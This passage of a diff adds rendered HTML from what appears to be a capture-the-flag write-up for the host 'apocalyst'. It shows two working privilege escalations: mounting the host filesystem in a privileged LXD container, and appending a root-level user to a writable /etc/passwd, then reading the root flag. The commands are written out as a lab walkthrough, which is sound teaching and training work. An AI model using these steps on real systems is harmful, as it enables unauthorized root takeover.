+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+<span class="c">#Create the container</span>
+<span class="nb">sudo</span> <span class="nv">$HOME</span>/go/bin/distrobuilder build-lxd alpine.yaml <span class="nt">-o</span> image.release<span class="o">=</span>3.8
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Add the image:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>lxc image import lxd.tar.xz rootfs.squashfs <span class="nt">--alias</span> alpine
+Image imported with fingerprint: 6939398362a8e14b01de3fbaa1d3b28a40c3e1f8bd06346aaadc6c42c6034d8a
+<span class="nv">$ </span>lxc image list
++--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
+| ALIAS  | FINGERPRINT  | PUBLIC |              DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
++--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
+| alpine | 6939398362a8 | no     | Alpinelinux 3.8 x86_64 <span class="o">(</span>20210723_1125<span class="o">)</span> | x86_64 | 1.92MB | Jul 23, 2021 at 11:27am <span class="o">(</span>UTC<span class="o">)</span> |
++--------+--------------+--------+----------------------------------------+--------+--------+-------------------------------+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Create the container and add root path:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>lxc init alpine privesc <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+<span class="nv">$ </span>lxc list <span class="c">#List containers</span>
++---------+---------+------+------+------------+-----------+
+|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
++---------+---------+------+------+------------+-----------+
+| privesc | STOPPED |      |      | PERSISTENT | 0         |
++---------+---------+------+------+------------+-----------+
+<span class="nv">$ </span>lxc config device add privesc host-root disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Execute the container:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>lxc start privesc
+<span class="nv">$ </span>lxc <span class="nb">exec </span>privesc /bin/sh
+~ <span class="c"># whoami</span>
+root
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="method-2-etcpasswd-editable">Method 2: /etc/passwd editable</h3>
+<p>We can even do this with user www-data, as it’s world-writable:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre>www-data@apocalyst:/<span class="nv">$ </span>openssl passwd pass
+2NBM/9qsNPXFY
+www-data@apocalyst:/<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"caretaker:2NBM/9qsNPXFY:0:0:User_like_root:/root:/bin/bash"</span> <span class="o">&gt;&gt;</span> /etc/passwd
+www-data@apocalyst:/<span class="nv">$ </span>su caretaker
+pass
+
+root@apocalyst:/# <span class="nb">cat</span> /root/root.txt
+1cb9d00f62d6015e07e58fa02caaf57f
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
